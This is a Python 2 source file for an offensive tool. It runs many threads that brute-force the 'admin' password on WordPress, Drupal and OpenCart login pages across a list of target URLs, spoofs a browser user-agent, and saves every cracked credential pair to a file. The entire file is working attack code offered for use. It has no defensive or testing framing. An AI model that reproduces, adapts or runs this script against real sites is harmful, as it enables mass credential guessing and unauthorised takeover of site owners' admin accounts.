import urlparse
import requests
import builtwith
import threading

import wrapper_config 

import Queue


class CMSBrute(threading.Thread):

    def __init__(self, cms, url, queue):
        threading.Thread.__init__(self)
        self.queue = queue
        self.cms = cms
        self.url = url


    def run(self):
    	while True:
            pwd = self.queue.get()
            self.brute(pwd)
            self.queue.task_done()

    def brute(self,  passw):
    	try:
            print "Start brute"
            found = []
            url = self.url
            headers = { "Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain", "User-Agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)" }
            cms = self.cms
            if ('WordPress' in cms):
                url = urlparse.urljoin(url, '/') + "wp-login.php"
                response = requests.get(url, headers=headers, timeout=160)
                if(response.status_code == 200):
                    print "[-] URL: " + url + " Login: admin | Password: " + passw 
                    wp = {'log': 'admin', 'pwd': passw, 'wp-submit': 'Login', 'redirect_to': url + '/wp-admin/' }
                    response = requests.post(url, data=wp, headers=headers, timeout=160)
                    if('/wp-admin' in response.url):
                        found = '[+] URL: ' + url + ' Login: admin | password: ' + passw + '\n'
                        open(wrapper_config.BRUTE_SAVE_FILE, 'a+').write(str(found) + '\n')
                        print found
            elif('Drupal' in cms):
                url = urlparse.urljoin(url, '/') + "user/login"
                response = requests.get(url, headers=headers, timeout=160)
                if(response.status_code == 200):
                    print "[-] URL: " + url + " Login: admin | Password: " + passw 
                    drupal = { 'name': 'admin', 'pass': passw, 'form_build_id': '', 'form_id': 'user_login',  'op' : 'Log in' }
                    response = requests.post(url, data=drupal, headers=headers, timeout=160)
                    if ('Log out' in response.content):
                        found = '[+] URL: ' + url + ' Login: admin | password: ' + passw + '\n'
                        open(wrapper_config.BRUTE_SAVE_FILE, 'a+').write(str(found) + '\n')
                        print found
            elif('OpenCart' in cms):
                url = urlparse.urljoin(url, '/') + "/admin/index.php"
                response = requests.get(url, headers=headers, timeout=160)
                if(response.status_code == 200):
                    print "[-] URL: " + url + " Login: admin | Password: " + passw 
                    opencart = { 'username': 'admin', 'password': passw }
                    response = requests.post(url, data=opencart, headers=headers, timeout=160)
                    if ('Logout' in response.content):
                        found = '[+] URL: ' + url + ' Login: admin | password: ' + passw + '\n'
                        open(wrapper_config.BRUTE_SAVE_FILE, 'a+').write(str(found) + '\n')
                        print found            
        except Exception, error_code:
        	print error_code


def checkcms(url):
    try:
        cms = builtwith.builtwith(url)
        w = url + " | CMS: " + cms["cms"][0]
    except:
        w = "Not Found"
    return w


def main(cms, url, thread):
    queue = Queue.Queue()
    for i in range(thread):
        insts = CMSBrute(cms, url, queue)
        insts.setDaemon(True)
        insts.start()
    passw = open(wrapper_config.PASSW_FILE).read().splitlines()
    for pwd in passw:
        queue.put(pwd)

    queue.join()


def brutecont():
    if wrapper_config.BRUTE_CMS == True:
        urls = open(wrapper_config.URLS_FILE).read().splitlines()
        for url in urls:
            url = urlparse.urljoin(url, '/')
            cms = checkcms(url)
            print url + " " + cms
            main(cms, url, wrapper_config.THREADS_BRUTE)


